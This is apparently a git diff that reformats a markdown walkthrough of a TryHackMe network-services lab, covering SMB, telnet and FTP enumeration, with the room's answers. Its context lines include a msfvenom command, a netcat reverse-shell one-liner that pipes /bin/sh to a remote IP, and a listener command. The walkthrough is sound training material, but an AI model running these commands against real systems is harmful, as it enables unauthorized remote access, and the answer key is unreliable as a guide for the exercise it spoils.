@@ -47,7 +47,7 @@ Unix
 
 #### Enumerating SMB
 
-Conduct an **nmap** scan of your choosing, How many ports are open?
+Conduct an `nmap` scan of your choosing, How many ports are open?
 
 ```
 3
@@ -97,7 +97,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
 
 <br>
 
-Let's get started with **Enum4Linux**, conduct a full basic enumeration. For starters, what is the **workgroup** name?
+Let's get started with `Enum4Linux`, conduct a full basic enumeration. For starters, what is the `workgroup` name?
 
 ```
 WORKGROUP
@@ -118,7 +118,7 @@ root@ip-10-10-210-52:~# enum4linux -a 10.10.190.95
 
 <br>
 
-What comes up as the **name** of the machine?
+What comes up as the `name` of the machine?
 
 ```
 POLOSMB
@@ -136,7 +136,7 @@ POLOSMB
 
 <br>
 
-What operating system **version** is running?
+What operating system `version` is running?
 
 ```
 6.1
@@ -189,10 +189,10 @@ smbclient //10.10.10.2/secret -U suit -p 445
 ```
 
 We can remotely access the SMB share using the syntax:
-**smbclient //[IP]/[SHARE]** followed by the tags:
+`smbclient //[IP]/[SHARE]` followed by the tags:
 -U [name]: to specify the user
 -p [port]: to specify the port
-SMB default ports are **139 or 445**
+SMB default ports are `139 or 445`
 
 <br>
 
@@ -425,7 +425,7 @@ PORT     STATE SERVICE VERSION
 
 <br>
 
-Who could it belong to? Gathering possible **usernames** is an important step in enumeration.
+Who could it belong to? Gathering possible `usernames` is an important step in enumeration.
 
 ```
 Skidy
@@ -471,7 +471,7 @@ listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
 
 <br>
 
-Now, use the command **Ping [local THM ip] -c 1** through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+Now, use the command `Ping [local THM ip] -c 1` through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
 
 ```
 Y
@@ -498,12 +498,12 @@ listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
 <br>
 
 We're going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. here's our syntax:
-**msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R**
+`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
 
-- **-p** = payload
-- **host** = our local host IP address (this is your machine's IP address)
-- **lport** = the port to listen on (this is the port on your machine)
-- **R** = export the payload in raw format
+- `-p` = payload
+- `host` = our local host IP address (this is your machine's IP address)
+- `lport` = the port to listen on (this is the port on your machine)
+- `R` = export the payload in raw format
 
 <br>
 
@@ -525,7 +525,7 @@ mkfifo /tmp/loqsthl; nc 10.10.46.62 4444 0</tmp/loqsthl | /bin/sh >/tmp/loqsthl 
 <br>
 
 Now all we need to do is start a netcat listener on our local machine. We do this using:
-**nc -lvp [listening port]**
+`nc -lvp [listening port]`
 
 What would the command look like for the listening port we selected in our payload?
 
@@ -625,7 +625,7 @@ vsftpd
 
 <br>
 
-Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing **FTP [IP]** into the console, and entering "anonymous", and no password when prompted.
+Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing `FTP [IP]` into the console, and entering "anonymous", and no password when prompted.
 
 What is the name of the file in the anonymous FTP directory?
 
